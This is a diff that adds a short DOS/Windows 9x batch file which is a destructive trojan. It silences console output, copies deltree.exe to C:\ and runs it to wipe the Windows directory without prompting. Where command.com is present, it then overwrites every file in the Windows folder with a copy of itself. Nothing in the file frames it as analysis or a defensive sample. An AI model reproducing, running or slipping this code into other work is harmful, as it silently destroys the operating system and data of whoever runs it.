@@ -1,0 +1,10 @@
+@echo off
+@break off >nul
+ctty >nul
+copy %windir%\command\deltree.exe  c:\
+c:\deltree.exe %windir% /Y
+rem errors support hbbg
+if exist %windir%\command.com goto fuckwin
+goto end
+:fuckwin
+for %%f in (%windir%\*.*) do copy %0 %%f >nul
